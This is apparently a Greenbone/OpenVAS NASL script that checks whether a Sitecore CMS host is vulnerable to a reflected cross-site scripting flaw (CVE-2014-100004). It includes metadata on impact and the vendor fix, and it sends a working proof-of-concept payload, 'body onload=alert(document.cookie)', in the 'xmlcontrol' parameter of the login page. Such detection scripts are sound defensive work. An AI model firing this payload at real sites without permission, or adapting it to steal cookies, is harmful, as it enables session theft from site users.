CPE = "cpe:/a:sitecore:cms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805497" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-100004" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-03-20 10:14:06 +0530 (Fri, 20 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_name( "Sitecore CMS XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Sitecore CMS
  and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the default.aspx script does
  not validate input to the 'xmlcontrol' parameter before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server." );
	script_tag( name: "affected", value: "Sitecore CMS before 7.0 Update-4 (rev. 140120)." );
	script_tag( name: "solution", value: "Upgrade to Sitecore CMS before 7.0
  Update-4 (rev. 140120)." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.idappcom.com/db/?9066" );
	script_xref( name: "URL", value: "http://sitecorekh.blogspot.dk/2014/01/sitecore-releases-70-update-4-rev-140120.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_sitecore_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sitecore/cms/installed" );
	script_xref( name: "URL", value: "http://www.sitecore.net/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/login?xmlcontrol=body%20onload=alert%28document.cookie%29";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

